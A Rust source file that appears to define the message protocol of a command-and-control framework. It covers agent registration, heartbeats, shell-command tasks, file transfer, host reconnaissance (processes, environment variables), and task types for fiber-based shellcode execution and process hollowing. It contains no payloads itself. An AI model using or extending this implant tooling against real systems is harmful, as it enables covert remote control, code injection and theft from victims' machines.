use serde::{Deserialize, Serialize};
use crate::{current_timestamp, generate_uuid};

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
pub enum MessageType {
    Registration,
    Heartbeat,
    TaskAssignment,
    TaskResult,
    FileUpload,
    FileDownload,
    ShellcodeExecution, // New: For fiber-based shellcode execution
    ProcessInjection,   // New: For advanced injection techniques
    SystemInfo,
    AgentUpdate,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Message {
    pub id: String,
    pub msg_type: MessageType,
    pub timestamp: u64,
    pub content: String,
    pub agent_id: Option<String>,
}

impl Message {
    pub fn new(msg_type: MessageType, content: String, agent_id: Option<String>) -> Self {
        Self {
            id: generate_uuid(),
            msg_type,
            timestamp: current_timestamp(),
            content,
            agent_id,
        }
    }

    pub fn registration(content: String) -> Self {
        Self::new(MessageType::Registration, content, None)
    }

    pub fn heartbeat(agent_id: String) -> Self {
        Self::new(MessageType::Heartbeat, "heartbeat".to_string(), Some(agent_id))
    }

    pub fn task_assignment(content: String, agent_id: String) -> Self {
        Self::new(MessageType::TaskAssignment, content, Some(agent_id))
    }

    pub fn task_result(content: String, agent_id: String) -> Self {
        Self::new(MessageType::TaskResult, content, Some(agent_id))
    }

    pub fn shellcode_execution(content: String, agent_id: String) -> Self {
        Self::new(MessageType::ShellcodeExecution, content, Some(agent_id))
    }

    pub fn process_injection(content: String, agent_id: String) -> Self {
        Self::new(MessageType::ProcessInjection, content, Some(agent_id))
    }

    pub fn ack(agent_id: Option<String>) -> Self {
        Self::new(MessageType::Heartbeat, "ACK".to_string(), agent_id)
    }
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct RegistrationData {
    pub hostname: String,
    pub os_type: String,
    pub os_version: String,
    pub ip_address: String,
    pub username: String,
    pub process_id: u32,
    pub process_name: String,
    pub architecture: String,
    pub capabilities: Vec<String>, // New: Agent capabilities
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct TaskData {
    pub task_id: String,
    pub task_type: String,
    pub command: String,
    pub parameters: std::collections::HashMap<String, String>,
    pub timeout: Option<u64>,
    pub priority: u8, // 0-255, higher is more important
}

impl TaskData {
    pub fn new(task_type: String, command: String) -> Self {
        Self {
            task_id: generate_uuid(),
            task_type,
            command,
            parameters: std::collections::HashMap::new(),
            timeout: None,
            priority: 100,
        }
    }

    pub fn shell_command(command: String) -> Self {
        Self::new("shell".to_string(), command)
    }

    pub fn fiber_shellcode(shellcode_b64: String) -> Self {
        let mut task = Self::new("fiber_shellcode".to_string(), "execute".to_string());
        task.parameters.insert("shellcode".to_string(), shellcode_b64);
        task.parameters.insert("method".to_string(), "direct_fiber".to_string());
        task
    }

    pub fn fiber_hollowing(shellcode_b64: String, target_process: String) -> Self {
        let mut task = Self::new("fiber_hollowing".to_string(), "execute".to_string());
        task.parameters.insert("shellcode".to_string(), shellcode_b64);
        task.parameters.insert("target_process".to_string(), target_process);
        task.parameters.insert("method".to_string(), "process_hollowing".to_string());
        task
    }

    pub fn file_download(file_path: String) -> Self {
        let mut task = Self::new("file_download".to_string(), file_path.clone());
        task.parameters.insert("path".to_string(), file_path);
        task
    }

    pub fn file_upload(file_path: String, content_b64: String) -> Self {
        let mut task = Self::new("file_upload".to_string(), file_path.clone());
        task.parameters.insert("path".to_string(), file_path);
        task.parameters.insert("content".to_string(), content_b64);
        task
    }

    pub fn system_info() -> Self {
        Self::new("system_info".to_string(), "collect".to_string())
    }
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct TaskResult {
    pub task_id: String,
    pub status: String, // "success", "error", "timeout"
    pub output: String,
    pub error: Option<String>,
    pub execution_time_ms: u64,
    pub timestamp: u64,
}

impl TaskResult {
    pub fn success(task_id: String, output: String, execution_time_ms: u64) -> Self {
        Self {
            task_id,
            status: "success".to_string(),
            output,
            error: None,
            execution_time_ms,
            timestamp: current_timestamp(),
        }
    }

    pub fn error(task_id: String, error: String, execution_time_ms: u64) -> Self {
        Self {
            task_id,
            status: "error".to_string(),
            output: String::new(),
            error: Some(error),
            execution_time_ms,
            timestamp: current_timestamp(),
        }
    }

    pub fn timeout(task_id: String, execution_time_ms: u64) -> Self {
        Self {
            task_id,
            status: "timeout".to_string(),
            output: String::new(),
            error: Some("Task execution timeout".to_string()),
            execution_time_ms,
            timestamp: current_timestamp(),
        }
    }
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct FileData {
    pub filename: String,
    pub content: Vec<u8>,
    pub file_size: u64,
    pub checksum: String, // SHA256 hash
}

impl FileData {
    pub fn new(filename: String, content: Vec<u8>) -> Self {
        use std::collections::hash_map::DefaultHasher;
        use std::hash::{Hash, Hasher};
        
        let file_size = content.len() as u64;
        let mut hasher = DefaultHasher::new();
        content.hash(&mut hasher);
        let checksum = format!("{:x}", hasher.finish());

        Self {
            filename,
            content,
            file_size,
            checksum,
        }
    }
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct SystemInformation {
    pub hostname: String,
    pub os_name: String,
    pub os_version: String,
    pub architecture: String,
    pub cpu_cores: u32,
    pub memory_mb: u64,
    pub disk_space_mb: u64,
    pub network_interfaces: Vec<NetworkInterface>,
    pub running_processes: Vec<ProcessInfo>,
    pub installed_software: Vec<String>,
    pub environment_variables: std::collections::HashMap<String, String>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct NetworkInterface {
    pub name: String,
    pub ip_address: String,
    pub mac_address: String,
    pub interface_type: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ProcessInfo {
    pub pid: u32,
    pub name: String,
    pub executable_path: String,
    pub command_line: String,
    pub memory_usage_kb: u64,
    pub cpu_usage_percent: f32,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_message_creation() {
        let msg = Message::heartbeat("agent-123".to_string());
        assert_eq!(msg.msg_type, MessageType::Heartbeat);
        assert_eq!(msg.agent_id, Some("agent-123".to_string()));
        assert_eq!(msg.content, "heartbeat");
    }

    #[test]
    fn test_task_data_creation() {
        let task = TaskData::shell_command("whoami".to_string());
        assert_eq!(task.task_type, "shell");
        assert_eq!(task.command, "whoami");
        assert!(!task.task_id.is_empty());
    }

    #[test]
    fn test_fiber_shellcode_task() {
        let task = TaskData::fiber_shellcode("base64_shellcode".to_string());
        assert_eq!(task.task_type, "fiber_shellcode");
        assert_eq!(task.parameters.get("shellcode"), Some(&"base64_shellcode".to_string()));
        assert_eq!(task.parameters.get("method"), Some(&"direct_fiber".to_string()));
    }
}
